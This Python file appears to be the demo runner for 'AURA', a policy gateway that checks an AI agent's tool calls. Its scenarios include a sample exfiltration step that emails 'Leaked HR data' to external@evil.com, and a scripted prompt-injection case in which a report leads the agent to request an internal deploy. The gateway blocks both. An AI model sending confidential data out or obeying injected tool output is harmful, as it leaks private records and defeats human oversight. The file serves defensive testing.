"""AURA Command Line Interface and Demonstration Runner.

Provides interactive commands to demonstrate all 5 core scenarios,
inspect audit records, and verify hash-chain integrity.
"""

from __future__ import annotations

import argparse
import sys
from pathlib import Path

from aura.agent import AgentLoop, LLMResponse, ScriptedLLMClient, ToolCallProposal
from aura.gateway import AuraGateway
from aura.models import (
    AgentIdentity,
    AuraRequest,
    Decision,
    RunContext,
    ToolAction,
)


def run_demo(config_dir: str = "config") -> None:
    print("=================================================================")
    print("                AURA Enforcement Gateway Demo                    ")
    print("=================================================================")

    gw = AuraGateway.create_default(config_dir=config_dir)

    # ── Scenario 1: Authorized File Read ──
    print("\n[Scenario 1] Authorized File Read (Fast-Path ALLOW)")
    reader = AgentIdentity(agent_id="reader_agent", role="reader")
    req1 = AuraRequest(
        request_id="demo-scen1",
        action=ToolAction.READ_FILE,
        params={"doc_id": "public/readme"},
        agent=reader,
    )
    res1 = gw.handle(req1, RunContext(request=req1))
    print(f"  Decision        : {res1.decision.value}")
    print(f"  Execution Status: {res1.execution_status}")
    print(f"  Output Content  : {res1.execution_result['content'][:40]}...")
    assert res1.decision == Decision.ALLOW

    # ── Scenario 2: Confidential Data Exfiltration Blocked ──
    print("\n[Scenario 2] Confidential Read -> Tainted Run -> Egress Blocked")
    admin = AgentIdentity(agent_id="admin_agent", role="admin")
    ctx2 = RunContext(request=req1)
    req2_read = AuraRequest(
        request_id="demo-scen2-read",
        action=ToolAction.READ_FILE,
        params={"doc_id": "confidential/hr_records"},
        agent=admin,
    )
    res2_read = gw.handle(req2_read, ctx2)
    print(f"  Step 1 (Read)   : {res2_read.decision.value} (Run Tainted={ctx2.taint.tainted})")

    req2_egress = AuraRequest(
        request_id="demo-scen2-egress",
        action=ToolAction.SEND_EMAIL,
        params={"to": "external@evil.com", "body": "Leaked HR data"},
        agent=admin,
    )
    res2_egress = gw.handle(req2_egress, ctx2)
    print(f"  Step 2 (Egress) : {res2_egress.decision.value} (Reason={res2_egress.error})")
    print(f"  Email Adapter Calls: {gw.tool_registry.get(ToolAction.SEND_EMAIL).call_count}")
    assert res2_egress.decision == Decision.BLOCK

    # ── Scenario 3: Sensitive Operation Approval Workflow ──
    print("\n[Scenario 3] Sensitive Operation -> Digest-Bound Approval Workflow")
    req3 = AuraRequest(
        request_id="demo-scen3",
        action=ToolAction.CALL_API,
        params={"op": "api/internal_deploy"},
        agent=admin,
    )
    ctx3 = RunContext(request=req3)
    # Inject approval rule
    from aura.models import RuleResult
    from aura.rules import Rule

    class DeployApprovalRule(Rule):
        def evaluate(self, req, ctx):
            if req.action == ToolAction.CALL_API and req.params.get("op") == "api/internal_deploy":
                return RuleResult(rule_id="deploy_approval", decision=Decision.APPROVAL, reason_code="DEPLOY_OP_APPROVAL")
            return None

    gw.policy_engine._rules.insert(0, DeployApprovalRule("deploy_approval"))
    res3 = gw.handle(req3, ctx3)
    print(f"  Step 1 (Request): {res3.decision.value} ({res3.error})")
    approval_id = res3.error.split("approval_id=")[-1]

    # Approver approves
    gw.approval_manager.resolve_approval(approval_id, approver_id="compliance_officer", approved=True)
    print(f"  Step 2 (Approve): Approved by compliance_officer")

    # Atomic consumption and execution of stored action
    res3_exec = gw.execute_approved_action(approval_id, claiming_agent=admin, run_ctx=ctx3)
    print(f"  Step 3 (Execute): {res3_exec.decision.value} (Status={res3_exec.execution_status})")
    assert res3_exec.decision == Decision.ALLOW

    # ── Scenario 4: Prompt Injection in Tool Output ──
    print("\n[Scenario 4] Prompt Injection in Tool Output -> Deterministic Block")
    gw.tool_registry.reset_all_counters()
    analyst = AgentIdentity(agent_id="analyst_agent", role="analyst")
    # Analyst reads report, injected payload tells LLM to call api/internal_deploy
    injection_step = LLMResponse(
        tool_calls=[
            ToolCallProposal(tool_name="call_api", arguments={"op": "api/internal_deploy"})
        ]
    )
    loop = AgentLoop(gateway=gw, llm_client=ScriptedLLMClient([injection_step]))
    run_res = loop.run("Process report", agent=analyst)
    print(f"  Agent Tool Calls: {run_res.total_tool_calls}, Blocked: {run_res.blocked_tool_calls}")
    print(f"  Side Effect Prevented: CALL_API counter={gw.tool_registry.get(ToolAction.CALL_API).call_count}")

    # ── Scenario 5: JEV Fail Closed ──
    print("\n[Scenario 5] JEV Outage / Timeout -> Fail Closed")
    from aura.jev.mock import MockJEVProvider
    timeout_jev = MockJEVProvider(should_timeout=True)
    gw.jev_provider = timeout_jev
    # Defer to JEV
    class DeferRule(Rule):
        def evaluate(self, req, ctx):
            return RuleResult(rule_id="defer", decision=Decision.DEFER, reason_code="AMBIGUOUS")
    gw.policy_engine._rules.insert(0, DeferRule("defer"))

    res5 = gw.handle(req1, RunContext(request=req1))
    print(f"  Decision: {res5.decision.value} (Error={res5.error})")
    assert res5.decision == Decision.BLOCK

    # ── Verify Audit Integrity ──
    print("\n[Audit Log Hash-Chain Integrity Verification]")
    is_valid, err = gw.audit_logger.verify_integrity()
    print(f"  Hash-Chain Intact: {is_valid} (Error={err})")
    print("=================================================================\n")


def main() -> None:
    parser = argparse.ArgumentParser(description="AURA Enforcement Layer CLI")
    parser.add_argument("--demo", action="store_true", help="Run full 5-scenario demo")
    parser.add_argument("--verify-audit", action="store_true", help="Verify audit log hash-chain integrity")
    args = parser.parse_args()

    if args.demo or len(sys.argv) == 1:
        run_demo()
    elif args.verify_audit:
        gw = AuraGateway.create_default()
        valid, err = gw.audit_logger.verify_integrity()
        print(f"Audit log verification: {'PASS' if valid else 'FAIL'} ({err})")


if __name__ == "__main__":
    main()
